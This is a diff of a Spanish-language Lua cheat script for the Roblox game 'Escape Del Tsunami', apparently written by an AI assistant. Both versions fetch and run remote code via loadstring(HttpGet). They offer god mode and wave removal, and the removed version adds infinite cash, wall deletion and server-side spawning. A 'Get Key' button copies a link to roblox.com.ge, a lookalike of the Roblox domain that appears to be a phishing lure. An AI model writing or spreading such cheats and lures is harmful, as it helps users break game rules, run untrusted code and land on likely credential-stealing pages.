@@ -1,71 +1,72 @@
--- 🌟 Speed Hub X Style - Escape Del Tsunami 2026
--- Interfaz Fluent UI (exacto como Speed Hub X) | by technoourielcompany
+-- 🔑 Sistema de Keys con Rayfield + Menú para Escape Del Tsunami
+-- by technoourielcompany
 
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-
-local Window = Fluent:CreateWindow({
-    Title = "Speed Hub X | Escape Del Tsunami",
-    SubTitle = "2026 • by technoourielcompany",
-    TabWidth = 160,
-    Size = UDim2.fromOffset(580, 460),
-    Acrylic = true,
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.RightControl
-})
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
 
 local KeyVerified = false
 
--- ====================== TAB KEY ======================
-local KeyTab = Window:AddTab({ Title = "🔑 Key System", Icon = "key" })
-
-KeyTab:AddParagraph({
-    Title = "Sistema de Verificación",
-    Content = "Pega tu key o usa el botón Get Key para obtener el link de la comunidad."
+-- Crear ventana principal
+local Window = Rayfield:CreateWindow({
+    Name = "Escape Del Tsunami",
+    LoadingTitle = "Cargando...",
+    LoadingSubtitle = "by technoourielcompany",
+    ConfigurationSaving = { Enabled = false },
+    Discord = { Enabled = false },
+    KeySystem = false
 })
 
-KeyTab:AddInput({
-    Title = "Introduce tu Key",
-    Placeholder = "Escribe tu clave aquí...",
+-- Tab de Key
+local KeyTab = Window:CreateTab("Key", 4483362458)
+
+-- Caja de texto (sin placeholder de clave específica)
+local KeyBox = KeyTab:CreateInput({
+    Name = "Introduce tu Key",
+    PlaceholderText = "Escribe tu clave aquí...",
+    RemoveTextAfterFocusLost = false,
     Callback = function(text)
+        -- Acepta cualquier texto no vacío (puedes cambiar la condición si quieres una clave fija)
         if text \~= "" then
             KeyVerified = true
-            Fluent:Notify({
-                Title = "✅ ¡Verificado!",
-                Content = "Bienvenido al hub OP 🌊💀",
-                Duration = 5
+            Rayfield:Notify({
+                Title = "✅ Correcto",
+                Content = "Clave aceptada - ¡A jugar!",
+                Duration = 4
             })
-            CreateMainMenu()
+            CreateHackerMenu()
         else
-            Fluent:Notify({
+            Rayfield:Notify({
                 Title = "❌ Error",
-                Content = "La clave no puede estar vacía",
+                Content = "Introduce una clave",
                 Duration = 3
             })
         end
-    end
+    end,
 })
 
-local GetKeyBtn = KeyTab:AddButton({
-    Title = "📋 Get Key (Comunidad Roblox)",
+-- Botón Get Key: copia el link de la comunidad que tenías
+local GetKeyButton = KeyTab:CreateButton({
+    Name = "📋 Get Key",
     Callback = function()
         local link = "https://roblox.com.ge/communities/4362678772/"
         setclipboard(link)
-        Fluent:Notify({
+        Rayfield:Notify({
             Title = "📋 Copiado",
-            Content = "Link de la comunidad copiado. Pégalo en tu navegador.",
-            Duration = 6
+            Content = "Link de la comunidad copiado al portapapeles. Pégalo en tu navegador.",
+            Duration = 5
         })
-    end
+    end,
 })
 
--- ====================== CREAR MENÚ PRINCIPAL ======================
-function CreateMainMenu()
-    -- Tab Principal
-    local MainTab = Window:AddTab({ Title = "🌊 Survival", Icon = "home" })
+-- Función para crear el menú principal (agrega aquí tus funciones favoritas)
+function CreateHackerMenu()
+    local MainTab = Window:CreateTab("🌊 Principal", 4483362458)
 
-    MainTab:AddToggle({
-        Title = "God Mode (Inmortal)",
-        Default = false,
+    MainTab:CreateSection("Funciones Básicas")
+
+    -- Ejemplo: God Mode
+    MainTab:CreateToggle({
+        Name = "God Mode (Inmortal)",
+        CurrentValue = false,
         Callback = function(Value)
             if Value then
                 spawn(function()
@@ -79,122 +80,42 @@ function CreateMainMenu()
                     end
                 end)
             end
-        end
+        end,
     })
 
-    MainTab:AddToggle({
-        Title = "Remove/Freeze Tsunami + Anti-Wave",
-        Default = false,
+    -- Ejemplo: Freeze Tsunami
+    MainTab:CreateToggle({
+        Name = "Freeze Tsunami / Remove Wave",
+        CurrentValue = false,
         Callback = function(Value)
             if Value then
                 spawn(function()
                     while Value do
                         for _, part in pairs(workspace:GetDescendants()) do
                             local n = part.Name:lower()
-                            if n:find("wave") or n:find("tsunami") or n:find("water") or n:find("flood") then
+                            if n:find("wave") or n:find("tsunami") or n:find("water") then
                                 if part:IsA("BasePart") then
                                     part.Transparency = 1
                                     part.CanCollide = false
                                     part.Velocity = Vector3.new(0,0,0)
-                                    part.Anchored = true
                                 end
                             end
                         end
-                        task.wait(1)
+                        task.wait(1.5)
                     end
                 end)
             end
-        end
+        end,
     })
 
-    MainTab:AddToggle({
-        Title = "Auto Farm Brainrots + Collect",
-        Default = false,
-        Callback = function(Value)
-            -- Aquí va tu función AutoFarmBrainrots() del script anterior
-            if Value then AutoFarmBrainrots() end
-        end
-    })
+    -- Agrega aquí más toggles, botones, sliders, etc. que quieras
+    -- Por ejemplo: Auto Farm, ESP, Teleports, Spawner...
 
-    -- Spawner (como Speed Hub X)
-    local SpawnerSection = MainTab:AddSection("Spawner OP")
-    local SelectedRarity = "Mythical"
-
-    MainTab:AddDropdown({
-        Title = "Rareza a Spawnear",
-        Options = {"Common", "Rare", "Legendary", "Mythical", "Divine", "Celestial", "Infinite"},
-        Default = "Mythical",
-        Callback = function(Value)
-            SelectedRarity = Value
-        end
-    })
-
-    MainTab:AddToggle({
-        Title = "Auto Spawn (Infinite)",
-        Default = false,
-        Callback = function(Value)
-            if Value then
-                spawn(function()
-                    while Value do
-                        local rs = game:GetService("ReplicatedStorage")
-                        if rs:FindFirstChild("SpawnBrainrot") then
-                            rs.SpawnBrainrot:FireServer(SelectedRarity)
-                        end
-                        task.wait(0.5)
-                    end
-                end)
-            end
-        end
-    })
-
-    -- Tab Exploits
-    local ExploitTab = Window:AddTab({ Title = "⚡ Exploits", Icon = "zap" })
-    ExploitTab:AddToggle({
-        Title = "Delete VIP Walls / Barriers",
-        Default = false,
-        Callback = function(v)
-            if v then
-                for _, wall in pairs(workspace:GetDescendants()) do
-                    if wall.Name:lower():find("vip") or wall.Name:lower():find("barrier") then
-                        wall:Destroy()
-                    end
-                end
-            end
-        end
-    })
-
-    ExploitTab:AddButton({
-        Title = "Infinite Cash / Tokens",
-        Callback = function()
-            local p = game.Players.LocalPlayer
-            if p.leaderstats then
-                for _, stat in pairs(p.leaderstats:GetChildren()) do
-                    if stat.Name:lower():find("cash") or stat.Name:lower():find("token") then
-                        stat.Value = math.huge
-                    end
-                end
-            end
-        end
-    })
-
-    -- Tab Visual
-    local VisualTab = Window:AddTab({ Title = "👁️ Visual", Icon = "eye" })
-    VisualTab:AddToggle({
-        Title = "ESP Raros (Mythical+)",
-        Default = false,
-        Callback = function(v) 
-            if v then EnableRareESP() else DisableESP() end 
-        end
-    })
-
-    Fluent:Notify({
-        Title = "Speed Hub X cargado",
-        Content = "¡Todo listo! Disfruta rompiendo el tsunami 🌊",
-        Duration = 8
+    Rayfield:Notify({
+        Title = "¡Menú cargado!",
+        Content = "Disfruta las funciones 🌊",
+        Duration = 4
     })
 end
 
--- Funciones extras (copia las que tenías antes: AutoFarmBrainrots, AutoRareBrainrots, EnableRareESP, etc.)
--- Si quieres que las pegue completas, dime y te las añado en el siguiente mensaje.
-
-print("🌟 Speed Hub X - Escape Del Tsunami cargado correctamente")
+print("Script cargado - Get Key copia el link de la comunidad")
